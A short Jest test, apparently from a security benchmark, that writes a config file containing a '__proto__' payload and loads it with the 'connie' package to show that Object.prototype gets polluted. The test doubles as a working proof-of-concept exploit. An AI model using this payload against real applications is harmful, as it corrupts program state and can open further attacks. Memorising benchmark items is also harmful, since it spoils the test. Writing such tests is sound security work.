test("prototype pollution in connie", () => {
  expect({}.polluted).toBe(undefined);

  const connie = require("connie");
  const fs = require("fs");
  const path = require("path");
  const pathToConfig = path.resolve(__dirname, process.env.SECBENCH_PAYLOAD || ("./config.json"));

  fs.writeFileSync(pathToConfig, `{"__proto__": {"polluted": "yes"}}`);
  connie("file", pathToConfig)
    .read()
    .then(() => {
      expect({}.polluted).toBe("yes");
      fs.unlinkSync(pathToConfig);
    });
});
